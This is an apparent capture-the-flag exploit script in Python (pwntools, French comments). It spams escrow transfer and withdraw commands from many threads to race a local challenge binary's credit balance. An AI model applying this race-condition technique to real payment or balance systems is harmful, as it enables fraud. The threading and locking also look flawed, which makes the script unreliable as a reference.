from pwn import *
import threading
import time

context.binary = './challenge'

def exploit():
    p = process('./challenge')
    lock = threading.Lock()

    # Passer le menu initial
    p.recvuntil(b'Select Option:')

    def worker():
        try:
            while True:
                with lock:
                    # Alterner ou spammer les actions d'escrow pour exploiter le décalage asynchrone
                    p.sendline(b'2')
                    p.sendline(b'100') # Transférer le solde max (100 crédits)
                    
                    p.sendline(b'3')   # Retirer de l'escrow
        except Exception:
            pass

    # Lancement des threads d'attaque
    threads = []
    for _ in range(15):
        t = threading.Thread(target=worker)
        threads.append(t)
        t.start()

    # Laisser tourner un court instant pour accumuler la race condition
    time.sleep(1)

    # Vérifier le solde final
    with lock:
        p.sendline(b'1')
        try:
            output = p.recvuntil(b'Main Menu:', timeout=2)
            print(output.decode())
        except Exception:
            # Si le binaire a crashé, on récupère ce qu'il reste
            print(p.clean().decode())

    p.close()

if __name__ == '__main__':
    exploit()